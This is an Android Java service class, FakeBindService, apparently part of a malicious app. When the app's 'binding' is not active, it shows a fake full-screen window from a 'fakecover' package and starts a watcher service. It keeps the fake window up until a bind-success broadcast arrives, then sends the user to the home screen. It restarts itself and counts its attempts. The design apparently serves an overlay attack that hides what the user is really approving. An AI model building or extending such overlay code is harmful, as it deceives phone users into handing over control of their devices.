package com.xstd.qm.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.fakecover.FakeWindowBinding;
import com.xstd.qm.setting.MainSettingManager;

/**
 * Created by michael on 13-12-23.
 */
public class FakeBindService extends Service {

    public static final String ACTION_SHOW_FAKE_WINDOW = "com.xstd.plugin.fake";

    private FakeWindowBinding window = null;
    private boolean mHasRegisted;

    private Handler mHandler = new Handler(Looper.getMainLooper());
    public static final String BIND_SUCCESS_ACTION = "com.bind.action.success";
    private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            UtilsRuntime.goHome(getApplicationContext());

            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
//                    android.os.Process.killProcess(android.os.Process.myPid());
                    if (window != null) {
                        window.dismiss();
                    }
                }
            }, 300);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();


        if (AppRuntime.isBindingActive(getApplicationContext())) {
            stopSelf();
            return;
        } else {
            mHasRegisted = true;
            registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
            showFakeWindow();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (mHasRegisted) {
            unregisterReceiver(mBindSuccesBRC);
        }
    }

    private synchronized void showFakeWindow() {
        if (AppRuntime.WATCHING_SERVICE_ACTIVE_RUNNING.get()) return;

        window = new FakeWindowBinding(getApplicationContext(), new FakeWindowBinding.WindowListener() {

            @Override
            public void onWindowPreDismiss() {
                UtilsRuntime.goHome(getApplicationContext());
            }

            @Override
            public void onWindowDismiss() {
                window = null;
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        MainSettingManager.getInstance().setDeviceBindingActiveTime(MainSettingManager.getInstance().getDeviceBindingActiveTime() + 1);
                        stopSelf();
                    }
                }, 300);
            }
        });
        window.show();
        window.updateTimerCount();

        Intent i1 = new Intent();
        i1.setClass(getApplicationContext(), WatchBindService.class);
        startService(i1);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
